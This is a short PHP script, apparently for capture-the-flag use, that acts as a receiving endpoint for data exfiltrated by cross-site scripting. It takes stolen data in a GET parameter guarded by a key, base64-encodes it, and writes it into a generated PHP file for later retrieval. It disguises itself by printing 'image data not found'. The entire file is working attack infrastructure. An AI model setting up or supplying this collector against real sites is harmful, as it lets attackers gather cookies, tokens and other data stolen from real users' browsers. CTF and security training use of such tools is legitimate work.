<?php
// This is a simple implant for your website to receive a XSS data stream
// The main purpose of this is to allow you to use a simple hosted website during a CTF to get your response
// And avoid exposing your system to the world if not on closed CTF network
// two get params required:
//   	k = "secret" key to allow the file to work.  You'll need to change this key pretty much after every get request
//	d = the data you are XSS exfiltrating
// You need to make sure the write permissions for the directory allow this file to write.
echo "image data not found";

$expected_key = "putsecrethere";
$datafilename = "datarecvd.php";
if ($expected_key === $_GET["k"]) {
	// Get data
	$data = $_GET["d"];
	// Encode it (otherwise I might be providing a direct code writing capability on the server!
	$data =  base64_encode($data);
	// The file to write
	// Must GET this file with the same key you used here, and it will display the base64 encoded data
	$towrite = '<?php $expected_key="'.$expected_key.'"; if ($expected_key === $_GET["k"]) {echo "'.$data.'";} ?>';
	//echo "here it is: $towrite";
	$myfile = fopen($datafilename, "w");
	fwrite($myfile, $towrite);
	fclose($myfile);	
} 

?>
